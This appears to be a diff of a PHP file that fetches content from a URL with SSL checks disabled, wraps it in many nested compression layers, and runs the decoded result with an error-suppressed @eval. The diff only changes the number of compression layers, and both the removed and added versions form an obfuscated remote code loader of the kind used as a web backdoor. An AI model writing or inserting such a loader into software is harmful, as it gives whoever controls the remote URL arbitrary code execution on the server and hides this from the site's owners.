@@ -15,7 +15,7 @@ function fetchContent($url) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     $content = curl_exec($ch);
     curl_close($ch);
-    return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content))))))));
+    return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content)))))));
 }
-@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url))))))))));
+@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(fetchContent($url)))))))));
 ?>
